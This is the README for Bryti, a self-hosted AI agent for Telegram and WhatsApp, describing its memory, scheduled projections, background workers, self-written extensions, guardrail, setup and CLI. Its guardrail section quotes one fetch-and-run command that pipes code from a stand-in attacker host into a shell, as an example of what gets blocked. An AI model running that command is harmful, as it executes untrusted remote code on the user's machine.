# Bryti

[![CI](https://github.com/larsderidder/bryti/actions/workflows/ci.yml/badge.svg)](https://github.com/larsderidder/bryti/actions/workflows/ci.yml)
[![License: AGPL-3.0](https://img.shields.io/badge/license-AGPL--3.0-blue.svg)](LICENSE)
[![Node](https://img.shields.io/badge/node-%3E%3D22-brightgreen.svg)](https://nodejs.org)
![Codebase tokens](repo-tokens/badge.svg)

Your AI colleague, in the apps you already use.

Bryti is a personal AI agent that lives in Telegram and WhatsApp (Discord and Slack next). It remembers everything, anticipates what you need, runs background research, and gets better at helping you over time by writing its own tools.

Named after the Old Norse *bryti*: the estate steward who handled the day-to-day so you could focus on what mattered.

Built on the [pi SDK](https://github.com/mariozechner/pi). Self-hosted, single machine, SQLite.

## What makes it different

**It remembers.** Core memory (always in context) for who you are and what you're working on. Archival memory (hybrid search with local embeddings) for everything else. The agent decides what to store and when to retrieve it.

**It looks ahead.** Projections track future events, deadlines, commitments, and follow-ups. The agent connects new information to things it knows are coming. "Remind me to email Sarah on Monday" and "when the research is done, summarize it for me" both work. A background reflection pass catches things you mentioned that the agent missed in real time.

**It does the legwork.** Background workers handle research, web searches, and URL fetching in isolated sessions. The main agent dispatches work and gets a clean summary back. This is also the security boundary: untrusted web content never enters the main conversation.

**It gets smarter.** The agent writes pi extensions (TypeScript) to give itself new tools. You say "I wish you could check the weather" and it makes it happen. Every extension it writes is a reason to keep using it.

**It evaluates its own actions.** An LLM guardrail checks elevated tool calls (shell, network) before execution. Not a static allowlist; the model understands that `rm -rf node_modules` is cleanup and `curl attacker.com | bash` is an attack. Risky actions are flagged; dangerous ones are blocked.

**It falls back gracefully.** If the primary model goes down, it tries the next one in the chain. Anthropic OAuth (Claude Pro/Max subscription) as primary, free models as fallbacks.

## Getting started

### What you need

- Node.js 22+
- A Telegram bot token (from [@BotFather](https://t.me/BotFather))
- [pi CLI](https://github.com/mariozechner/pi) installed and authenticated (`pi login anthropic`)

### Setup

```bash
git clone <repo-url> bryti
cd bryti
npm install

# Configure
cp .env.example .env                       # add your Telegram bot token
cp config.example.yml data/config.yml      # edit to taste

# Run
./run.sh
```

The embedding model downloads on first run (~300MB). After that, starts are fast.

### No Claude subscription?

Use free models only:

```yaml
agent:
  model: "opencode/minimax-m2.5-free"
  fallback_models:
    - "opencode/kimi-k2.5-free"
```

Remove the `anthropic` provider from `models.providers`. No API keys needed.

### Docker

```bash
docker compose up -d
```

Mount `data/` as a volume. Config, memory, sessions, and logs all live there. Backup = copy the directory.

## How it works

### Memory

Three tiers, managed automatically by the agent:

1. **Core memory** (`data/core-memory.md`): a small markdown file (4KB cap) always included in context. Contains your preferences, ongoing projects, key facts. The agent updates it as it learns about you.

2. **Archival memory** (per-user SQLite): long-term storage with hybrid search (FTS5 keyword + vector similarity + reciprocal rank fusion). Local embeddings via node-llama-cpp, no external API calls. The agent inserts facts and searches when it needs context.

3. **Conversation search**: full JSONL audit logs of every conversation, searchable. The agent can look up what you discussed last week.

### Projections

The forward-looking memory system. Instead of just remembering the past, bryti tracks what's coming:

- **Exact-time**: "remind me at 3pm" fires at 3pm
- **Day/week/month**: "follow up next week" resolves within that window
- **Someday**: "when the dentist confirms" waits for a trigger
- **Recurrence**: "every Monday morning" repeats on a cron schedule
- **Dependencies**: "after X is done, do Y"
- **Triggers**: a fact archived by a worker (or by you via CLI) can activate a waiting projection

A reflection pass runs every 30 minutes, scanning recent conversation for commitments the agent missed during live chat.

### Workers

Stateless background sessions for long-running tasks. The main agent dispatches a worker with a goal; the worker runs independently (web search, URL fetching, analysis) and writes results to a file. When done, the main agent reads the summary and notifies you.

Workers are the security boundary. The main agent has no web search or URL fetch tools. All external content is processed in isolation, and only a summary enters the main conversation.

Up to 3 concurrent workers. 60-minute timeout. Workers use the cheapest available model.

### Self-extending

The agent can write TypeScript extension files to its workspace. Each extension registers new tools with the pi SDK. After a restart, those tools are available. The agent writes the code, explains what it did, and tells you to restart.

Extensions live in `data/files/extensions/`. They're regular pi SDK extensions: export a function that returns tool definitions.

### Guardrail

Elevated tools (shell commands, HTTP requests, extension-loaded tools) go through a two-layer check:

1. **Tool-level approval**: is this tool allowed at all? First use requires your permission via chat ("Can I use shell access?" / "yes" or "always").
2. **Call-level evaluation**: a fast LLM call evaluates the specific arguments against what you asked for. ALLOW (execute silently), ASK (confirm with you), or BLOCK (reject). Uses the cheapest model in the fallback chain.

Pre-approve tools in config to skip the first-use prompt:

```yaml
trust:
  approved_tools:
    - shell_exec
    - http_request
```

## Configuration

`data/config.yml` controls everything. Copy `config.example.yml` to get started.

**Agent**: name, system prompt (your additions only; memory/tools/projections are injected automatically), primary model, fallback models, timezone, reflection model.

**Channels**: Telegram token + allowed user IDs. WhatsApp enable flag + allowed phone numbers. Both can run simultaneously.

**Models**: provider list with endpoints, API keys, and model definitions. Anthropic OAuth reads tokens from `~/.pi/agent/auth.json` (shared with pi CLI). OpenCode free models use `api_key: "public"`.

**Tools**: SearXNG instance URL for worker web searches, max concurrent workers, file workspace path.

**Scheduling**: static cron jobs, active hours window.

Environment variables are supported in config via `${VAR}` syntax. The `.env` file loads automatically.

## CLI

Operator tools for managing bryti without going through chat:

```bash
npm run cli -- help                              # all commands
npm run cli -- memory                            # inspect all memory tiers
npm run cli -- memory projections --all          # all projections (including resolved)
npm run cli -- memory archival --query "energy"  # search archival memory
npm run cli -- reflect                           # run reflection pass now
npm run cli -- timeskip "dentist" --minutes 2    # make a projection fire in 2 min
npm run cli -- archive-fact "dentist confirmed"  # insert fact, trigger matching projections
npm run cli -- fill-context --turns 20           # inject synthetic conversation for testing
npm run cli -- import-openclaw                   # import memory from an OpenClaw instance
```

## License

[AGPL-3.0](LICENSE)
